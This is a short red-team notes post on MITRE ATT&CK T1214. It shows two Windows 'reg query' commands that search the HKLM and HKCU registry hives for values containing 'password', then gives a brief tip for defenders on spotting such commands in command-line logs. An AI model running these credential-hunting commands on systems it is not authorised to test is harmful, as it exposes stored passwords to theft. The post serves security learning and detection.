---
layout: post
title: "t1214 credentials in registry"
date: 2024-06-18
categories: credential-access-and-credential-dumping
tags: redteam, mitre, killchain, offensivesecurity, cpent, cpts, oscp, exploit
permalink: /credential-access-and-credential-dumping/
---

---
description: 'Internal recon, hunting for passwords in Windows registry'
---

# Credentials in Registry

## Execution

Scanning registry hives for the value `password`:

{% code title="attacker@victim" %}
```csharp
reg query HKLM /f password /t REG_SZ /s
# or
reg query HKCU /f password /t REG_SZ /s
```
{% endcode %}

## Observations

As a defender, you may want to monitor commandline argument logs and look for any that include `req query` and `password`strings:

![](../../.gitbook/assets/passwords-registry.png)

## References

{% embed url="https://attack.mitre.org/wiki/Technique/T1214" %}
@spotheplanet
